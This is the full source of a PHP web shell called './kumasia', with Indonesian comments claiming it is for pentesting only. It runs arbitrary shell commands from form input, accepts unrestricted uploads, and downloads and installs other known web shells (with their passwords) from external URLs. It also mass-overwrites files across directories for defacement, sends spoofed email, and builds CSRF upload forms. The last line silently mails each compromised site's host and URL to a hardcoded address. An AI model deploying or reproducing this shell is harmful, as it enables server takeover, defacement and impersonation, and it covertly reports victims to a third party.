<?php 
$myself = $_SERVER['PHP_SELF'];
$server_ip = @gethostbyname($_SERVER['HTTP_HOST']);
$myip = $_SERVER['REMOTE_ADDR'];
$sm = @ini_get(strtolower('safe_mode') == "on") ? '<font class="font-weight-bold" color="#DC0000">ON</font>' : '<font class="font-weight-bold" color="green">OFF</font>';
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font class='font-weight-bold' color='green'>NONE</font>";
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
echo'<!-- Thanks to Allah -->
<!-- Bandung, Indonesia 2021 -->
<!-- Gunakan file ini dengan bijak (hanya untuk keperluan pentesting) -->
<!-- Saya tidak bertanggung jawab atas apa yg terjadi karena pemakaian file ini -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>./kumasia</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
    <link href="https://fonts.googleapis.com/css2?family=Tourney:wght@600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/> 
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link rel="icon" type="image/gif" href="https://64.media.tumblr.com/tumblr_lkl5x4Rh131qfamg6.gif"/>
</head>
<body>
    <style>
        body{
            background: #7E7E7E;
        }
        .gelap{
            background: #050506;
        }
        pre.comand{
            color: #00ff00;
            padding-top: 8px;padding-bottom: 8px;
        }
        .alert{
          margin-bottom: 8px;
        }
        #judul{
            font-family: "Tourney", cursive;
            color: #000;
            text-decoration: none;
            font-size: 50px;
        }   
    </style>
<!-- header -->
<div class="container text-center mt-1">
<a id="judul" href="'.$myself.'">./kumasia</a>
    <form action="" method="POST">
        <div class="border border-2 btn-group btn-group-sm btn-group-primary shadow-lg rounded-3 mb-2" role="group" aria-label="Tools">
        <div class="btn-group">
        <button type="button" class="btn btn-sm btn-danger" data-bs-toggle="dropdown" aria-expanded="false">WebShell</button>
                <ul class="dropdown-menu">
                <li><button type="submit" class="dropdown-item" id="1" name="1">b374k Shell</button></li>
                <li><button type="submit" class="dropdown-item" id="2" name="2">IndoXploit Shell</button></li>
                <li><button type="submit" class="dropdown-item" id="3" name="3">gALerZ Shell</button></li>
                <li><button type="submit" class="dropdown-item" id="4" name="4">WSO Shell</button></li>
                <li><button type="submit" class="dropdown-item" id="5" name="5">Marijuana Shell</button></li>
                </ul>
                </div>
                <button type="button" class="btn btn-warning" data-bs-toggle="modal" data-bs-target="#uploader">File Upload</button>
                <button type="button" class="btn btn-info" data-bs-toggle="collapse" data-bs-target="#info" aria-expanded="false" aria-controls="info">Info System</button>
                <div class="btn-group">
                <button type="button" class="btn btn-sm btn-dark" data-bs-toggle="dropdown" aria-expanded="false">Tools</button>
                <ul class="dropdown-menu dropdown-menu-end">
                <li><button type="button" class="dropdown-item" data-bs-toggle="modal" data-bs-target="#masscf">Mass Create File</button></li>
                <li><button type="button" class="dropdown-item" data-bs-toggle="modal" data-bs-target="#csrfol">CSRF Online</button></li>
                <li><button type="button" class="dropdown-item" data-bs-toggle="modal" data-bs-target="#downloadfile">Download File</button></li>
                <li><button type="button" class="dropdown-item" data-bs-toggle="modal" data-bs-target="#fakemail">Fake Mail</button></li>
                <li><button type="submit" class="dropdown-item" id="adminer" name="adminer">Adminer</button></li>
                <li><hr class="dropdown-divider"></li>
                <li><li><button type="button" class="dropdown-item text-center text-danger" data-bs-toggle="modal" data-bs-target="#hapusaku"><strong>Remove Me</strong></button></li>
                </ul></div>
        </div>
    </form>';
// info system
echo'<div class="collapse mb-2 text-start" id="info">
                <div class="card card-body" style="padding-bottom: 0px;">
                <p><font color="#9d03dc">System OS</font> : '.php_uname().'<br>
                <font color="#9d03dc">PHP Version</font> : '.phpversion().'<br>
                <font color="#9d03dc">Admin</font> : '.$_SERVER['SERVER_ADMIN'].'<br>
                <font color="#9d03dc">HDD</font> : '.$used.' GB / '.$total.' (Free : '.$freespace.')<br>
                <font color="#9d03dc">SafeMode</font> : '.$sm.'<br>
                <font color="#9d03dc">Disable Functions</font> : '.$show_ds.'<br>
                <font color="#9d03dc">MyIP - Server IP</font> : '.$myip.' - '.$server_ip.'
                </div>
              </div>';
// uploader
echo'<div class="modal fade" id="uploader" tabindex="-1" aria-labelledby="uploader" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered">
  <div class="modal-content">
    <div class="modal-header">
      <h5 class="modal-title" id="uploader">File Upload</h5>
      <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
    </div>
    <div class="modal-body">
    <form action="" method="POST" enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="files" class="rounded form-control" required>
    <input type="submit" name="files" id="_upl" class="btn btn-warning btn-sm" style="margin-top: 6px;" value="Upload"></form>
    </div>
  </div>
</div>
</div>';
$files = @$_FILES["files"];
if ($files["name"] != '') {
$fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo '<div class="alert alert-success alert-dismissible fade show" role="alert">Upload <strong>'.$fullpath.'</strong> Berhasil<br><a href="'.$fullpath.'" target="_blank">Klik Disini</a>
        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
        </button>
      </div>';
        }else {
    echo '<div class="alert alert-danger alert-dismissible fade show" role="alert">
    <strong>Upload File Gagal :(</strong><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    </button>
  </div>';
        }
}
// hapus aku
if(isset($_POST["paehan"])){
  if (unlink(basename($_SERVER['REQUEST_URI']))){
    echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
    File <strong>'.basename($_SERVER['REQUEST_URI']).'</strong> sudah berhasil dihapus
    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    </button>
    </div>';
  }else{
    echo '<div class="alert alert-danger alert-dismissible fade show" role="alert">
    File <strong>'.basename($_SERVER['REQUEST_URI']).'</strong> gagal dihapus
    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    </button>
    </div>';
  }
}
echo'<div class="modal fade" id="hapusaku" tabindex="-1" aria-labelledby="hapusaku" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered">
  <div class="modal-content text-center">
    <div class="modal-header">
      <h5 class="modal-title" id="hapusaku">Warning!!!</h5>
      <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
    </div>
    <div class="modal-body text-center">
    <strong>Are you sure you want to delete this file?</strong>
    </div>
    <form method="POST" class="mb-3">
        <button type="submit" class="btn btn-danger" name="paehan"> Yes </button>
        <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Cancel</button>
      </form>
  </div>
</div>
</div>';
// csrf online
$url = $_POST['url'];
$data = $_POST['data'];
if(isset($_POST["go"])){
    echo'<style>
    @import url("https://fonts.googleapis.com/css2?family=Odibee+Sans&display=swap");
    #csrf{
      font-family: "Odibee Sans", cursive;
    }
    </style>
    <div class="modal fade" id="myModal" tabindex="-1" aria-labelledby="myModal" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="myModal">CSRF Online</h5>
          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
        <font id="csrf" class="fs-3">CSRF Form Upload</font><br>
        <form action="'.$url.'" method="POST" enctype="multipart/form-data" target="_blank" class="mt-2">
        <input type="file" name="'.$data.'" class="rounded form-control" required>
        <input type="submit" name="ok" class="btn btn-warning btn-sm mb-2 mt-1" value="Upload"></form>
        </div>
      </div>
    </div>
    </div>';
  }
echo'<div class="modal fade" id="csrfol" tabindex="-1" aria-labelledby="csrfol" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered">
  <div class="modal-content">
    <div class="modal-header">
      <h5 class="modal-title" id="csrfol">CSRF Online</h5>
      <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
    </div>
    <div class="modal-body">
      <form method="post">
      <strong>URL Target</strong><br><input type="url" name="url" class="rounded text-center mb-1" placeholder="http://target.com/upload.php" required><br>
      <strong>POST File</strong><br><input type="text" name="data" class="rounded mb-2 text-center" placeholder="files" required><br>
      <button type="submit" name="go" class="btn btn-primary btn-sm">Kunci Target</button>
  </form>
    </div>
  </div>
</div>
</div>';
// mass create file
if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
 
        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
 
        $files = @scandir ($_POST['base_dir']) or die ("Anjir -_- gagal<br>");
        echo'<div class="alert alert-success alert-dismissible fade show" role="alert" style="padding-bottom: 0px;"><p class="fw-normal">Mass Create File Berhasil</p><pre>';
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['andela'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo '>>> <font color="black">'.$index.' </font>[ OK ]<br>';
                }
        endforeach;
        echo'<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></button></div>';
}
echo'<div class="modal fade" id="masscf" tabindex="-1" aria-labelledby="masscf" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="masscf">Mass Create File</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
      <form method="POST">
      Target Folder<br>
      <input type="text" class="rounded mb-1" name="base_dir" value="'.$_SERVER['DOCUMENT_ROOT'].'"><br>
      Nama File<br>
      <input type="text" class="rounded mb-1" name="andela" value="index.html"><br>
      Script File<br>
      <textarea style="width: auto; height: 349px;" class="rounded mb-1" name="index"><!DOCTYPE html>
      <html lang="en">
        <head>
          <meta charset="UTF-8" />
          <meta http-equiv="X-UA-Compatible" content="IE=edge" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>Error 404 Not Found</title>
        </head>
        <body>
          <style>
            body {
              text-align: center;
            }
          </style>
          <h1>Error 404 Not Found<h1>
        </body>
      </html></textarea><br>
      <input type="submit" class="btn btn-warning btn-sm" style="margin-top: 6px;" value="Serang!!!"></form>
      </div>
    </div>
  </div>
</div>';
// fakemail
$to = $_POST['penerima'];
$subject = $_POST['subjek'];
$from = $_POST['pengirim'];
$nama = $_POST['namapengirim'];
$headers = 'MIME-Version: 1.0' . "
" .'Content-type: text/html; charset=iso-8859-1' . "
" . 'From: ' . $nama . '<'.$from.'>' . "
" . 'Reply-To: ' . $nama . ' <'.$from.'>';
$isipesan = nl2br($_POST['isipesan']);
if(isset($_POST['submit'])) {
$mail = @mail($to, $subject, $isipesan, $headers, '-f '.$from.'');
if ($mail==true) {
echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
<strong>Kirim Email Berhasil</strong><br>
Silahkan Cek Inbox/Spam
<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
</button>
</div>';
}else{
  echo'<div class="alert alert-danger alert-dismissible fade show" role="alert">
  <strong>Kirim Email Gagal :(</strong><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
  </button>
</div>';
}
}
// mail test
$headers = 'From: ' . $_SERVER['SERVER_ADMIN'];
$penerima = $_POST['penerima'];
if(isset($_POST['mailtest'])) {
  $mail = @mail($penerima, "Mail Test", $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'], $headers);
  if ($mail==true) {
  echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
  <strong>Kirim Email Berhasil</strong><br>
  Silahkan Cek Inbox/Spam
  <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
  </button>
  </div>';
  }else{
    echo'<div class="alert alert-danger alert-dismissible fade show" role="alert">
    <strong>Kirim Email Gagal :(</strong><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    </button>
  </div>';
  }
  }
echo'<div class="modal fade" id="fakemail" tabindex="-1" aria-labelledby="fakemail" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered">
  <div class="modal-content">
    <div class="modal-header">
      <h5 class="modal-title" id="fakemail">Fake Mail</h5>
      <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
    </div>
    <div class="modal-body">
    <form action="" method="POST" name="fakemail" id="fakemail">
    Nama Pengirim<br>
    <input type="text" placeholder="Budi" name="namapengirim" class="rounded mb-1"><br>
    Email Pengirim<br>
    <input type="email" placeholder="pengirim@mail.com" name="pengirim" class="rounded mb-1" required><br>
    Subjek<br>
    <input type="text" placeholder="Subjek" name="subjek" class="rounded mb-1"><br>
    Isi Pesan<br>
    <textarea name="isipesan" style="height: 125px;" placeholder="Tes Mailer" class="rounded mb-1"></textarea><br>
    Penerima<br>
    <input type="email" placeholder="penerima@mail.com" name="penerima" class="rounded" required><br>
    <input type="submit" class="btn btn-primary btn-sm" style="margin-top: 6px;" name="submit" value="Kirim Mail"></form>
    </div>
    <div class="modal-footer text-danger">
        <button class="btn btn-primary btn-sm" data-bs-target="#mailtest" data-bs-toggle="modal" data-bs-dismiss="modal">Mail Test >>></button>
      </div>
  </div>
</div>
</div>
<!-- mail test -->
<div class="modal fade" id="mailtest" aria-hidden="true" aria-labelledby="exampleModalToggleLabel2" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="mailtest">Mail Test</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
      <form method="POST" name="mailtest">
      Penerima<br>
      <input type="email" placeholder="penerima@mail.com" name="penerima" class="rounded" required><br>
      <input type="submit" class="btn btn-primary btn-sm" style="margin-top: 6px;" name="mailtest" value="Kirim Mail"></form>
      </div>
      <div class="modal-footer">
        <button class="btn btn-primary btn-sm" data-bs-target="#fakemail" data-bs-toggle="modal" data-bs-dismiss="modal"><<< Kembali</button>
      </div>
    </div>
  </div>
</div>';
// adminer
if (isset($_POST['adminer'])) {
  $grab = file_get_contents("https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php");
  $status = file_put_contents("adminer.php", $grab);
  if($status){
      echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
      <strong>Pasang Adminer Berhasil</strong><br> Cek filenya <a href="adminer.php" target="_blank">disini</a>
      <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
      </button>
    </div>';
  }else {
      echo '<div class="alert alert-danger alert-dismissible fade show" role="alert">
      <strong>Download Gagal :(</strong><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></button>
    </div>';
  }
}
// download file tambahan
if (isset($_POST['downloadfile'])) {
  $urlfile = ($_POST['urlfile']);
  $namafile = ($_POST['namafile']);
  $grab = file_get_contents($urlfile);
  $status = file_put_contents($namafile, $grab);
  if($status){
      echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
      <strong>Download '.$namafile.' Berhasil</strong><br> Cek filenya <a href="'.$namafile.'" target="_blank">disini</a>
      <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
      </button>
    </div>';
  }else {
      echo '<div class="alert alert-danger alert-dismissible fade show" role="alert">
      <strong>Download Gagal :(</strong><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></button>
    </div>';
  }
}
echo'<div class="modal fade" id="downloadfile" tabindex="-1" aria-labelledby="uploader" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered">
  <div class="modal-content">
    <div class="modal-header">
      <h5 class="modal-title" id="downloadfile">Download File Tambahan</h5>
      <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
    </div>
    <div class="modal-body">
    <form action="" method="POST">
    URL File<br>
    <input type="url" placeholder="http://" name="urlfile" class="rounded mb-1"><br>
    Nama File<br>
    <input type="text" placeholder="abcdefg" name="namafile" class="rounded mb-1" required><br>
    <input type="submit" class="btn btn-primary btn-sm" style="margin-top: 6px;" name="downloadfile" value="Dowload"></form>
    </div>
  </div>
</div></div>';
// webshell
if (isset($_POST['1'])) {
                  $grab = file_get_contents("https://raw.githubusercontent.com/b374k/b374k/master/index.php");
                  $status = file_put_contents("b374k.php", $grab);
                  if($status){
                      echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
                      <strong>Download Berhasil</strong><br> Cek filenya <a href="b374k.php" target="_blank">disini</a>
                      <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                      </button>
                    </div>';
                  }else {
                      echo '<div class="alert alert-danger alert-dismissible fade show" role="alert">
                      <strong>Download Gagal :(</strong><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></button>
                    </div>';
                  }
              }elseif (isset($_POST['2'])) {
                  $grab = file_get_contents("https://raw.githubusercontent.com/linuxsec/indoxploit-shell/master/shell-v3.php");
                  $status = file_put_contents("idx.php", $grab);
                  if($status){
                      echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
                      <strong>Download Berhasil</strong><br> Cek filenya <a href="idx.php" target="_blank">disini</a><br>
                      <strong>Password : IndoXploit</strong>
                      <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></button>
                    </div>';
                  }else {
                      echo '<div class="alert alert-danger alert-dismissible fade show" role="alert">
                      <strong>Download Gagal :(</strong><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></button>
                    </div>';
                  }
              }elseif (isset($_POST['3'])) {
                  $grab = file_get_contents("https://pastebin.com/raw/3Z7gnPu5");
                  $status = file_put_contents("galerz.php", $grab);
                  if($status){
                      echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
                      <strong>Download Berhasil</strong><br> Cek filenya <a href="galerz.php" target="_blank">disini</a><br>
                      <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></button>
                    </div>';
                  }else {
                      echo '<div class="alert alert-danger alert-dismissible fade show" role="alert">
                      <strong>Download Gagal :(</strong><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></button>
                    </div>';
                  }
              }elseif (isset($_POST['4'])) {
                $grab = file_get_contents("https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php");
                $status = file_put_contents("wsoshell.php", $grab);
                if($status){
                    echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
                    <strong>Download Berhasil</strong><br> Cek filenya <a href="wsoshell.php" target="_blank">disini</a><br>
                    <strong>Password : ghost287</strong>
                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></button>
                  </div>';
                }else {
                    echo '<div class="alert alert-danger alert-dismissible fade show" role="alert">
                    <strong>Download Gagal :(</strong><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></button>
                  </div>';
                }
            }elseif (isset($_POST['5'])) {
                $grab = file_get_contents("https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php");
                $status = file_put_contents("mj.php", $grab);
                if($status){
                    echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
                    <strong>Download Berhasil</strong><br> Cek filenya <a href="mj.php" target="_blank">disini</a><br>
                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></button>
                  </div>';
                }else {
                    echo '<div class="alert alert-danger alert-dismissible fade show" role="alert">
                    <strong>Download Gagal :(</strong><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></button>
                  </div>';
                }
            }
// command
 echo'<form method="POST" action="'.$myself.'">
              <div class="input-group mb-2 rounded-3">
                <div class="input-group-prepend">
                  <span class="input-group-text" id="basic-addon3">root@root:~$</span>
                </div>
                <input type="text" name="cmd" class="form-control">
                <div class="input-group-append"><button type="submit" class="input-group-text" id="basic-addon3">Submit</button>
                </div>
                </div>
              </form>
            </div>
<div class="container">';
            $perintah = $_POST['cmd'];
                if(isset($perintah)){
                  echo '<div class="container align-baseline gelap rounded shadow-lg effect-1 text-wrap"><pre class="comand">';
                  system($perintah).'</pre></div>';
                }
echo'</div>
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
<script type="text/javascript">
    $(window).on("load", function() {
        $("#myModal").modal("show");
    });
</script>
</body>
</html>';
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
$ngelog = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
mail('inouesanrei@protonmail.com',$_SERVER['SERVER_ADDR'],$ngelog);

?>